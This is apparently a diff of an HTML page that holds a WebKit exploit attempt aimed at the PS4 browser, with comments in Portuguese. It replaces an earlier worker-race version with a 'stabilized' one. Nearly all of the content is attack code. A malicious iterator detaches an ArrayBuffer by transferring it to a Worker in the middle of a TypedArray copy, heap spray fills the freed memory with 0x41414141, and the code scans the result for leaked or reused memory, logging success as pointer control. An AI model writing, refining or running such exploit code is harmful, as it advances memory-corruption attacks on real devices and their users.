@@ -2,15 +2,15 @@
 <html lang="pt-BR">
 <head>
     <meta charset="UTF-8">
-    <title>PS4 No-JIT Exploit (Worker Race)</title>
+    <title>PS4 Worker UAF (Stable)</title>
     
 </head>
 <body>
-    <h2>WEBKIT ADDR_OF (WORKER DETACH)</h2>
-    <p>Estratégia: Logic Bug (C++) sem JIT. Uso de Thread Worker para UAF.</p>
+    <h2>WEBKIT UAF STABILIZED</h2>
+    <p>Estratégia: UAF via Worker + Integer Spray (Evita Crash Imediato)</p>
     
-    <button onclick="startExploit()">INICIAR EXPLOIT (Worker Race)</button>
-    <div id="console">Log do Sistema...</div>
+    <button id="btnRun" onclick="startStableExploit()">INICIAR EXPLOIT (Tentar Leitura)</button>
+    <div id="console">Pronto. Clique para iniciar...</div>
 
     <script>
         const logDiv = document.getElementById('console');
@@ -19,131 +19,113 @@
             logDiv.scrollTop = logDiv.scrollHeight;
         }
 
-        const _buf = new ArrayBuffer(8);
-        const _f64 = new Float64Array(_buf);
-        const _u32 = new Uint32Array(_buf);
-
-        function d2h(val) {
-            _f64[0] = val;
-            let lo = _u32[0].toString(16).padStart(8, '0');
-            let hi = _u32[1].toString(16).padStart(8, '0');
-            return `0x${hi}${lo}`;
-        }
-
-        // Configurações
-        const UAF_SIZE = 0x4000; // Tamanho do Buffer
+        // Configuração
+        const UAF_SIZE = 0x800; // 2KB (Menor = Mais estável para alinhamento)
+        const SPRAY_PATTERN = 0x41414141; // 'AAAA' em Hex
         var worker = null;
 
-        // Código do Worker (inline para facilitar)
+        // Código do Worker
+        // Simplesmente recebe o buffer para causar o 'Detach'
         const workerCode = `
             onmessage = function(e) {
-                // O Worker recebe o buffer e o transfere para si mesmo
-                // Isso causa o "Detach" na thread principal instantaneamente
-                // postMessage é usado para transferir (neuter)
                 const ab = e.data;
-                postMessage("DETACHED", [ab]);
+                // Mantém o buffer vivo por um milissegundo para garantir a transferência
+                setTimeout(() => { postMessage("PONG"); }, 1);
             };
         `;
 
-        function startExploit() {
-            log("Iniciando Worker...");
+        async function startStableExploit() {
+            document.getElementById('btnRun').disabled = true;
+            log("Inicializando Worker...");
+            
+            if (worker) worker.terminate();
             const blob = new Blob([workerCode], {type: 'application/javascript'});
             worker = new Worker(URL.createObjectURL(blob));
 
-            worker.onmessage = function(e) {
-                // Apenas confirmação de que o worker está vivo
-                if (e.data === "DETACHED") {
-                    // Buffer foi morto.
-                }
-            };
+            log("Iniciando Race Loop (20 tentativas)...");
 
-            log("Tentando Race Condition (50x)...");
-            
-            // Loop de tentativas
-            let attempts = 0;
-            const maxAttempts = 50;
+            for (let attempt = 1; attempt <= 20; attempt++) {
+                // Feedback visual sem floodar
+                if(attempt % 5 === 0) log(`Tentativa ${attempt}/20...`);
 
-            function attempt() {
-                attempts++;
-                if (attempts > maxAttempts) {
-                    log("Falha após 50 tentativas. Recarregue.");
-                    return;
+                let result = await runRaceIteration();
+                
+                if (result) {
+                    log(`🛑 UAF SUCESSO! Memória Reutilizada!`, 'vuln');
+                    log(`Valor Lido: 0x${result.toString(16)}`, 'vuln');
+                    log("Isso prova que controlamos o ponteiro sem crashar.", 'success');
+                    return; // Para tudo
                 }
 
-                // 1. Objeto Alvo (Canary)
-                let canary = { a: 0x1337, b: 0xDEAD };
+                // Pequena pausa para estabilizar o GC
+                await new Promise(r => setTimeout(r, 100));
+            }
 
-                // 2. Buffer Fonte (Source)
-                // Criamos um array buffer que será copiado
-                let srcBuffer = new ArrayBuffer(UAF_SIZE);
-                let srcView = new DataView(srcBuffer);
-                // Preenche com marcador seguro
-                for(let i=0; i < UAF_SIZE; i+=4) srcView.setUint32(i, 0xAABBCCDD, true);
+            log("Falha. O buffer foi protegido ou o Race não alinhou.");
+            document.getElementById('btnRun').disabled = false;
+        }
 
-                // 3. Iterador Malicioso
-                // O construtor TypedArray aceita um iterável.
-                // Isso nos permite rodar código A CADA ELEMENTO copiado.
-                let iter = {
-                    [Symbol.iterator]() {
-                        let i = 0;
-                        return {
-                            next() {
-                                i++;
-                                // PONTO CRÍTICO:
-                                // No meio da cópia (quando i chega num ponto específico),
-                                // mandamos o buffer para o Worker.
-                                if (i === (UAF_SIZE / 8)) { 
-                                    worker.postMessage(srcBuffer, [srcBuffer]);
-                                    
-                                    // SPRAY IMEDIATO:
-                                    // O buffer morreu. O interpretador está pausado aqui?
-                                    // Tentamos alocar o Canary no lugar do buffer morto.
-                                    // Em modo interpretado, isso às vezes funciona melhor com arrays simples.
-                                    let spray = new Array(100);
-                                    for(let k=0; k<100; k++) spray[k] = canary;
-                                }
-                                
-                                // Retorna valor dummy se o buffer ainda existir
-                                // Se o buffer sumiu (byteLength 0), retornamos 0x41
-                                if (srcBuffer.byteLength === 0) {
-                                    return { value: 0x41414141, done: false };
-                                }
-                                
-                                return { value: 0, done: i >= (UAF_SIZE/4) };
-                            }
-                        };
-                    }
-                };
-
+        function runRaceIteration() {
+            return new Promise((resolve) => {
                 try {
-                    // 4. Trigger
-                    // new Uint32Array(iter) vai consumir o iterador e criar um array novo.
-                    // Se o UAF funcionar, ele vai ler os ponteiros do nosso 'spray' 
-                    // achando que está lendo o resto do buffer antigo.
+                    // 1. Buffer Vítima (Source)
+                    let srcBuffer = new ArrayBuffer(UAF_SIZE);
+                    let srcView = new DataView(srcBuffer);
+                    // Preenche com 0xBBBBBBBB para diferenciar do nosso spray (0xAAAA...)
+                    for(let i=0; i < UAF_SIZE; i+=4) srcView.setUint32(i, 0xBBBBBBBB, true);
+
+                    // 2. O Iterador Sabotador
+                    let iter = {
+                        [Symbol.iterator]() {
+                            let i = 0;
+                            return {
+                                next() {
+                                    i++;
+                                    
+                                    // GATILHO: Aos 25% da cópia, transferimos o buffer
+                                    // Ajuste este valor se continuar falhando (ex: UAF_SIZE / 2)
+                                    if (i === (UAF_SIZE / 4)) { 
+                                        worker.postMessage(srcBuffer, [srcBuffer]);
+                                        
+                                        // SPRAY DE INTEIROS (Seguro)
+                                        // Tentamos ocupar o lugar do buffer morto com números 0x41414141
+                                        // Isso não crasha se o navegador tentar ler como ponteiro ou int.
+                                        let spray = new Uint32Array(UAF_SIZE / 4);
+                                        spray.fill(SPRAY_PATTERN);
+                                    }
+                                    
+                                    // Se o buffer for desligado, retornamos um marcador de erro
+                                    if (srcBuffer.byteLength === 0) {
+                                        return { value: 0xDEADDEAD, done: false };
+                                    }
+                                    
+                                    return { value: 0, done: i >= (UAF_SIZE / 2) };
+                                }
+                            };
+                        }
+                    };
+
+                    // 3. Execução (TypedArray Constructor)
+                    // O navegador começa a criar o array consumindo 'iter'
                     let res = new Uint32Array(iter);
 
-                    // 5. Scan
+                    // 4. Verificação Pós-Execução
                     for(let k=0; k < res.length; k++) {
                         let val = res[k];
-                        // Procuramos valores que não sejam 0 e não sejam 0xAABBCCDD
-                        // E não sejam nosso dummy 0x41414141
-                        if (val !== 0 && val !== 0xAABBCCDD && val !== 0x41414141) {
-                             log(`🛑 LEAK ENCONTRADO (Uint32)! Index: ${k}`, 'vuln');
-                             log(`Valor Hex: 0x${val.toString(16)}`, 'vuln');
-                             log("Nota: Como é Uint32Array, você tem a metade (Low/High) do ponteiro.", 'vuln');
-                             return; // Sucesso
+                        
+                        // Se lermos 0x41414141 (nosso spray) onde deveria haver 0xBBBB... ou 0
+                        // Significa que lemos a memória que nós mesmos injetamos!
+                        if (val === SPRAY_PATTERN) {
+                            resolve(val);
+                            return;
                         }
                     }
 
-                } catch(e) {
-                    // Erros de "Detached Buffer" são esperados e bons
+                } catch (e) {
+                    // Ignora erros de "Detached Buffer" pois são esperados
                 }
-
-                // Tenta novamente rápido
-                setTimeout(attempt, 50);
-            }
-
-            attempt();
+                resolve(null);
+            });
         }
     </script>
 </body>
